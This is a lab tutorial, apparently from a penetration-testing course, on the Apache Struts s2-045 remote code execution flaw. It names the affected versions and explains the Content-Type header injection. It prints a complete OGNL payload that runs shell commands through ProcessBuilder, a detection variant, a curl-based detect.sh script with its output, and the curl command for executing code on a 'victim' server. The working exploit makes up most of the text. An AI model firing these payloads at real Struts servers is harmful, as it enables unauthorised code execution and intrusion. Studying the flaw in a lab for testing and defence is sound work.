
# Struts s2-045

* This exercise covers a Remote Code Execution in Struts 2.

## Introduction

* This course details how to gain code execution when a Struts application is vulnerable to [s2-045](https://cwiki.apache.org/confluence/display/WW/S2-045). This vulnerability has already been widely exploited in the wild and is easily `worm-able`. Therefore, it's essential that you know how to test for it. It is also believe to be the vulnerability that was used to hack `Equifax`.

## Struts s2-045

* Struts s2-045 impacts the following versions of Struts:

    * Struts 2.3.5
    * Struts 2.3.31
    * Struts 2.5
    * Struts 2.5.10

* The issue comes from the evaluation of the `Content-Type` header when an error is generated by the framework. The vulnerable code is located in the management of file upload but can be triggered even if the application does not have an upload functionality.

## The payload

* A lot of exploits are already available, most of them are just wrappers around the following payload:
```http
%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
* The payload is used as the `Content-Type` for the request.

## Detection

* We can easily tweak this payload to allow us to detect the vulnerability without trying to run command.
```http
%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}
```
```bash
$ cat detect.sh 
curl --header "Content-Type: %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}" $1 
$ sh detect.sh [SERVER]

test

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
    <META HTTP-EQUIV="Refresh" CONTENT="0;URL=example/HelloWorld.action">
</head>

<body>
<p>Loading ...</p>
</body>
</html>
```

## Gaining code execution

* Gaining code execution with this payload is as simple as running a curl command with the right argument:
```bash
$ curl --header "Content-Type: [PAYLOAD]" http://[SERVER]/
```
* Where:

    * `[PAYLOAD]` is your payload.
    * `[SERVER]` is the victim.

## Conclusion

* This exercise explained how to gain code execution when a Struts application is vulnerable to `s2-045`. When you are coming across a Struts application, it's essential that you test for this issue.


* You can access this exercise using the following URL: http://ptl-afc27875-84b3e129.libcurl.so/ . You can also use the TLS version if you're experiencing timeouts due to network filtering: https://ptl-afc27875-84b3e129.libcurl.so/

